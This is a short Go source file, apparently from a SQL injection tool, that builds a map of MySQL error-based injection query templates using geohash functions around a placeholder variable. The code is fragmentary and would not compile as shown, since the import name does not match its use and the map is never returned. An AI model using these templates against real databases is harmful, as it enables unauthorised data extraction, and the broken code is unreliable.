package sqli_mysql

import(
	"core/data/replace"
)

type Error_based struct{
	Query map[string]string
}

func NewErrorBased(){
	new := Error_based{}

	query := make(map[string]string, 5)

	query["Geo_functions1"] = "SELECT ST_LatFromGeoHash(" + core_data_replace.Var_simbol + ")"
	query["Geo_functions2"] = "SELECT ST_LongFromGeoHash(" + core_data_replace.Var_simbol + ")"
	query["Geo_functions3"] = "SELECT ST_PointFromGeoHash(" + core_data_replace.Var_simbol + ")"
}